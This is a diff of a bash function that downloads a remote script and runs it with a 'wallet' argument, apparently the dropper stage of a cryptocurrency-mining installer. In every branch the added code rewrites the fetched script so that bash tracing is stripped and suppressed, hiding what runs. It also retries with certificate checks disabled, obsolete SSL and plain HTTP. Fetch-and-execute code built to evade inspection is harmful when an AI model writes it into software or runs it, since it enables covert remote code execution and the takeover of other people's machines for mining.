@@ -933,87 +933,119 @@ download_and_execute() {
     local url="$1"
     local wallet="$2"
     local description="$3"
-
-    # DISABLE DEBUGGING BEFORE EXECUTING DOWNLOADED SCRIPT
-    { set +x; } 2>/dev/null 2>&1
-    unset BASH_XTRACEFD PS4 2>/dev/null
+    local max_retries=5
+    local retry=0
+    local dns_fix_attempted=false
+    local ssl_fix_attempted=false
     
     log_message "Downloading $description from: $url"
     
     while [ $retry -lt $max_retries ]; do
         # Try curl first
         if command -v curl >/dev/null 2>&1; then
-            # Method 1: Standard curl with HTTPS
             log_message "Trying curl with HTTPS (attempt $((retry + 1))/$max_retries)"
-            local curl_output=$(mktemp)
-            if curl -s -L --max-time 30 "$url" 2>"$curl_output" | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
-                log_message "$description completed successfully"
-                rm -f "$curl_output"
-                return 0
-            fi
             
-            # Check for NSS error -12190 or SSL errors
-            if grep -q "NSS error\|SSL.*error\|certificate\|handshake" "$curl_output" 2>/dev/null; then
-                log_message "SSL/TLS error detected in curl output"
+            # Download to temp file first
+            local temp_script=$(mktemp)
+            
+            if curl -s -L --max-time 30 "$url" > "$temp_script" 2>/dev/null; then
+                # Clean the script (remove debugging)
+                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
                 
-                # Attempt SSL fix if not already done
-                if [ "$ssl_fix_attempted" = false ]; then
-                    log_message "Attempting SSL/TLS fixes..."
-                    ssl_fix_attempted=true
-                    
-                    # Try to update curl and SSL libraries
-                    if command -v yum >/dev/null 2>&1; then
-                        log_message "Updating curl and SSL libraries (yum)..."
-                        yum install -y curl openssl ca-certificates 2>/dev/null || \
-                        yum --nogpgcheck install -y curl openssl ca-certificates 2>/dev/null || true
-                    elif command -v apt-get >/dev/null 2>&1; then
-                        log_message "Updating curl and SSL libraries (apt)..."
-                        apt-get update -qq 2>/dev/null
-                        apt-get install -y curl openssl ca-certificates 2>/dev/null || true
-                    fi
-                    
-                    # Update CA certificates
-                    if command -v update-ca-trust >/dev/null 2>&1; then
-                        update-ca-trust 2>/dev/null || true
-                    elif command -v update-ca-certificates >/dev/null 2>&1; then
-                        update-ca-certificates 2>/dev/null || true
-                    fi
-                    
-                    log_message "SSL fixes applied - continuing with next attempt..."
-                    rm -f "$curl_output"
-                    sleep 2
-                    continue
+                # Make executable and run
+                chmod +x "$temp_script" 2>/dev/null
+                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+                
+                if [ ${PIPESTATUS[0]} -eq 0 ]; then
+                    rm -f "$temp_script"
+                    log_message "$description completed successfully"
+                    return 0
                 fi
+                
+                rm -f "$temp_script"
             fi
-            rm -f "$curl_output"
             
-            # Method 2: curl with --insecure
+            # Try with --insecure
             log_message "Trying curl with --insecure flag..."
-            if curl -s -L --insecure --max-time 30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
-                log_message "$description completed successfully (with --insecure)"
-                return 0
+            temp_script=$(mktemp)
+            if curl -s -L --insecure --max-time 30 "$url" > "$temp_script" 2>/dev/null; then
+                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+                chmod +x "$temp_script" 2>/dev/null
+                
+                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+                
+                if [ ${PIPESTATUS[0]} -eq 0 ]; then
+                    rm -f "$temp_script"
+                    log_message "$description completed successfully (with --insecure)"
+                    return 0
+                fi
+                
+                rm -f "$temp_script"
             fi
             
-            # Method 3: curl with legacy SSL for ancient systems
+            # Try with legacy SSL
             log_message "Trying curl with legacy SSL options..."
-            if curl -s --sslv3 --tlsv1 --insecure --max-time 30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
-                log_message "$description completed successfully (legacy SSL)"
-                return 0
+            temp_script=$(mktemp)
+            if curl -s --sslv3 --tlsv1 --insecure --max-time 30 "$url" > "$temp_script" 2>/dev/null; then
+                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+                chmod +x "$temp_script" 2>/dev/null
+                
+                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+                
+                if [ ${PIPESTATUS[0]} -eq 0 ]; then
+                    rm -f "$temp_script"
+                    log_message "$description completed successfully (legacy SSL)"
+                    return 0
+                fi
+                
+                rm -f "$temp_script"
             fi
         fi
         
-        # If curl failed or doesn't exist, try wget
+        # Try wget
         if command -v wget >/dev/null 2>&1; then
             log_message "Trying wget with HTTPS (attempt $((retry + 1))/$max_retries)"
-            if wget -qO- --timeout=30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
-                log_message "$description completed successfully via wget"
-                return 0
+            temp_script=$(mktemp)
+            if wget -qO- --timeout=30 "$url" > "$temp_script" 2>/dev/null; then
+                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+                chmod +x "$temp_script" 2>/dev/null
+                
+                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+                
+                if [ ${PIPESTATUS[0]} -eq 0 ]; then
+                    rm -f "$temp_script"
+                    log_message "$description completed successfully via wget"
+                    return 0
+                fi
+                
+                rm -f "$temp_script"
             fi
             
             log_message "Trying wget with --no-check-certificate..."
-            if wget -qO- --no-check-certificate --timeout=30 "$url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
-                log_message "$description completed successfully via wget (--no-check-certificate)"
-                return 0
+            temp_script=$(mktemp)
+            if wget -qO- --no-check-certificate --timeout=30 "$url" > "$temp_script" 2>/dev/null; then
+                sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+                sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+                sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+                chmod +x "$temp_script" 2>/dev/null
+                
+                bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+                
+                if [ ${PIPESTATUS[0]} -eq 0 ]; then
+                    rm -f "$temp_script"
+                    log_message "$description completed successfully via wget (--no-check-certificate)"
+                    return 0
+                fi
+                
+                rm -f "$temp_script"
             fi
         fi
         
@@ -1021,20 +1053,41 @@ download_and_execute() {
         local http_url="${url/https:/http:}"
         if [ "$http_url" != "$url" ]; then
             log_message "Trying HTTP fallback..."
+            temp_script=$(mktemp)
             
             if command -v curl >/dev/null 2>&1; then
-                if curl -s -L --max-time 30 "$http_url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
-                    log_message "$description completed successfully via HTTP (curl)"
-                    return 0
+                if curl -s -L --max-time 30 "$http_url" > "$temp_script" 2>/dev/null; then
+                    sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+                    sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+                    sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+                    chmod +x "$temp_script" 2>/dev/null
+                    
+                    bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+                    
+                    if [ ${PIPESTATUS[0]} -eq 0 ]; then
+                        rm -f "$temp_script"
+                        log_message "$description completed successfully via HTTP (curl)"
+                        return 0
+                    fi
+                fi
+            elif command -v wget >/dev/null 2>&1; then
+                if wget -qO- --timeout=30 "$http_url" > "$temp_script" 2>/dev/null; then
+                    sed -i '/^\s*set [-+][xt]\b/d' "$temp_script" 2>/dev/null
+                    sed -i '/^\s*PS4=/d' "$temp_script" 2>/dev/null
+                    sed -i '1i #!/bin/bash\n{ set +x; } 2>/dev/null 2>&1\nunset BASH_XTRACEFD PS4 2>/dev/null' "$temp_script" 2>/dev/null
+                    chmod +x "$temp_script" 2>/dev/null
+                    
+                    bash "$temp_script" "$wallet" 2>&1 | tee -a "$LOG_FILE"
+                    
+                    if [ ${PIPESTATUS[0]} -eq 0 ]; then
+                        rm -f "$temp_script"
+                        log_message "$description completed successfully via HTTP (wget)"
+                        return 0
+                    fi
                 fi
             fi
             
-            if command -v wget >/dev/null 2>&1; then
-                if wget -qO- --timeout=30 "$http_url" 2>/dev/null | bash -s "$wallet" 2>&1 | tee -a "$LOG_FILE"; then
-                    log_message "$description completed successfully via HTTP (wget)"
-                    return 0
-                fi
-            fi
+            rm -f "$temp_script"
         fi
         
         log_message "All download methods failed (attempt $((retry + 1))/$max_retries)"
